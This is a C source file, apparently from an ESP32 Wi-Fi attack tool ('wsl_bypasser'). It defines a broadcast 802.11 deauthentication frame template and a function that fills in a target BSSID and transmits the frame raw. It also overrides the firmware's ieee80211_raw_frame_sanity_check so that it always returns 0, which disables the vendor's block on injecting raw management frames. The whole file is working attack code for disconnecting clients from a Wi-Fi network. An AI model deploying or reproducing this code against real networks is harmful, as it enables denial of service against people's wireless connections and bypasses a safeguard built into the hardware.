#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG

#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";
/**
 * @brief Deauthentication frame template
 *
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 *
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false));
}

void wsl_bypasser_send_deauth_frame(const uint8_t *bssid) {
    ESP_LOGI(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);

    // TODO: remove it
    ESP_LOGI(TAG, "%.2x %.2x %.2x %.2x", deauth_frame[0], deauth_frame[1], deauth_frame[2], deauth_frame[3]);
    ESP_LOGI(TAG, "%.2x %.2x %.2x %.2x %.2x %.2x", deauth_frame[4], deauth_frame[5], deauth_frame[6], deauth_frame[7], deauth_frame[8], deauth_frame[9]);
    ESP_LOGI(TAG, "%.2x %.2x %.2x %.2x %.2x %.2x", deauth_frame[10], deauth_frame[11], deauth_frame[12], deauth_frame[13], deauth_frame[14], deauth_frame[15]);
    ESP_LOGI(TAG, "%.2x %.2x %.2x %.2x %.2x %.2x", deauth_frame[16], deauth_frame[17], deauth_frame[18], deauth_frame[19], deauth_frame[20], deauth_frame[21]);
    ESP_LOGI(TAG, "%.2x %.2x %.2x %.2x", deauth_frame[22], deauth_frame[23], deauth_frame[24], deauth_frame[25]);

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}